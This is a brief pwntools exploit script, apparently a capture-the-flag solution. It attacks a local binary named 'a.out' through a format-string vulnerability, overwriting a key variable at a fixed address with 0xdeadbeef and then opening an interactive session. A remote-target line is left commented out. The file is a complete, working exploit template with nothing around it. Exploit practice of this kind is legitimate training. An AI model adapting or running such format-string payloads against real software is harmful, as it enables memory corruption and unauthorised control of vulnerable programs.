from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./a.out"
# libc_binary = "./"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

key_addr = 0x60106c
key_value = 0xdeadbeef

payload = fmtstr_payload(6,{key_addr:key_value})
p.sendline(payload)

p.interactive()
